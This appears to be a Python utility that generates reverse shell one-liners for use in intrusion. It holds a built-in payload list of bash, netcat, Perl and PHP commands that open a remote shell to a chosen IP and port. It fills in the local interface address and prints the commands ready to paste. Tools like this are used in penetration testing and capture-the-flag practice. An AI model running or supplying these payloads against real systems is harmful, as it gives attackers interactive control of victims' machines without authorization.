#!/usr/bin/python3

from sys import exit
import argparse
import netifaces

revshells = [
    {
        "language": "bash",
        "payloads": [
            {
                "description": "Bash TCP",
                "command": "bash -c 'bash -i >& /dev/tcp/-ip-/-port- 0>&1'"
            },{
                "description": "Bash 196",
                "command": "0<&196;exec 196<>/dev/tcp/-ip-/-port-; bash <&196 >&196 2>&196"
            },{
                "description": "Bash read line",
                "command": "exec 5<>/dev/tcp/-ip-/-port-;cat <&5 | while read line; do $line 2>&5 >&5; done"
            },{
                "description": "Bash 5",
                "command": "bash -i 5<> /dev/tcp/-ip-/-port- 0<&5 1>&5 2>&5"
            }
        ]
    },{
        "language": "nc",
        "payloads": [
            {
                "description": "nc mkfifo",
                "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -ip- -port- >/tmp/f"
            },{
                "description": "nc -e",
                "command": "nc -e sh -ip- -port-"
            },{
                "description": "nc -c",
                "command": "nc -c sh -ip- -port-"
            }
        ]
    },{
        "language": "perl",
        "payloads": [
            {
                "description": "Perl",
                "command": """perl -e 'use Socket;$i="-ip-";$p=-port-;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'"""
            },{
                "description": "Perl no sh",
                "command": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"-ip-:-port-");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
            }
        ]
    },{
        "language": "php",
        "payloads": [
            {
                "description": "PHP system",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);system("bash <&3 >&3 2>&3");'"""
            },{
                "description": "PHP `",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);`bash <&3 >&3 2>&3`;'"""
            },{
                "description": "PHP popen",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);popen("bash <&3 >&3 2>&3", "r");'"""
            },{
                "description": "PHP passthru",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);passthru("bash <&3 >&3 2>&3", "r");'"""
            },{
                "description": "PHP shell_exec",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);shell_exec("bash <&3 >&3 2>&3", "r");'"""
            },{
                "description": "PHP popen",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);exec("bash <&3 >&3 2>&3", "r");'"""
            },{
                "description": "PHP proc_open",
                "command": """php -r '$sock=fsockopen("-ip-",-port-);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
            }
        ]
    }
]

def get_languages():
    return ','.join(map(str, list(map(lambda x: x["language"],revshells))))

def get_parser():
    parser = argparse.ArgumentParser(description="Generates reverse shell commands for the specified language")
    parser.add_argument("-p","--port",action="store", dest="port",default=443, type=int, help="Specifies the port to open the connection in")
    parser.add_argument("-i","--interface",action="store", dest="interface",default="eth0", help="Specifies the port to open the connection in")
    parser.add_argument("-l","--language",action="store", dest="language",default="bash", help=f"""Reverse shell language [{get_languages()}]""")
    return parser

def get_revshells(language,ip,port):
    result = ""
    payloads = next(item for item in revshells if item["language"] == language)
    for payload in payloads["payloads"]:
        result += "{:<20s} {:s}\n".format(payload["description"],payload["command"]).replace("-ip-",str(ip)).replace("-port-",str(port))
    return result

def ip_from_iface(iface):
    try:
        ip = netifaces.ifaddresses(iface).get(2)[0]["addr"]
        return ip
    except ValueError:
        exit(1)

def check_language(language):
    if language not in get_languages():
        exit(2)

def app():
    parser = get_parser()
    args = parser.parse_args()
    ip = ip_from_iface(args.interface)
    check_language(args.language)
    revshells = get_revshells(args.language,ip,args.port)
    print(revshells)

if __name__ == "__main__":
    app()